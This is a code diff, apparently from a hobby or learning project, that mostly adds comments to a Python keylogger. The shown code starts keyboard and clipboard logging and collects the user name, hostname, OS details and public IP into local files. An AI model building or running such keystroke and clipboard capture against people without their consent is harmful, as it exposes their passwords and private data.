@@ -1,14 +1,15 @@
-import getpass
-
+# import modules
 from pynput import keyboard
 import datetime
-import pyperclip
+import pyperclip # For clipboard logging
 import time
 import threading
-import socket
-import platform
-import requests
+import socket # To get hostname info
+import platform # To get OS and arch info
+import requests # To get public IP
+import getpass # To get current logged-in user
 
+# File names
 logFile = "log.txt"
 clipboardLogFile = "clipboard.txt"
 sysInfoFile = "sysinfo.txt"
@@ -68,17 +69,20 @@ def clipboard_monitoring():
 
 def get_system_info():
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    user = getpass.getuser()
-    hostname = socket.gethostname()
-    operating_system = platform.system()
-    version = platform.release()
-    architecture = platform.machine()
+    user = getpass.getuser()                # Current user logged in
+    hostname = socket.gethostname()         # System hostname
+    operating_system = platform.system()    # System OS
+    version = platform.release()            # System Version
+    architecture = platform.machine()       # System Architecture
 
+    # Tries to get public ip, if it cannot be found, public_ip field will state 'cannot be found'
     try:
-        public_ip = requests.get("https://api.ipify.org", timeout=6).text
+        # Gives 10 seconds to get IP before giving up
+        public_ip = requests.get("https://api.ipify.org", timeout=10).text
     except:
         public_ip = "Cannot be found"
 
+    # Write all info into log file
     with open (sysInfoFile, "a") as file:
         file.write(f"----- New Logging Session [{timestamp}] -----\n")
         file.write(f"User: {user}\n")
@@ -94,11 +98,11 @@ def get_system_info():
 
 if __name__ == "__main__":
     print("Keylogger started, press ESC to exit")
-
+    # Clipboard monitoring starts in the background
     threading.Thread(target=clipboard_monitoring, daemon=True).start()
-
+    # Call to get system info
     get_system_info()
-
+    # Start listening for keyboard strokes
     with keyboard.Listener(on_press=press, on_release=release) as listener:
         # listener remains running until release() returns False
         listener.join()
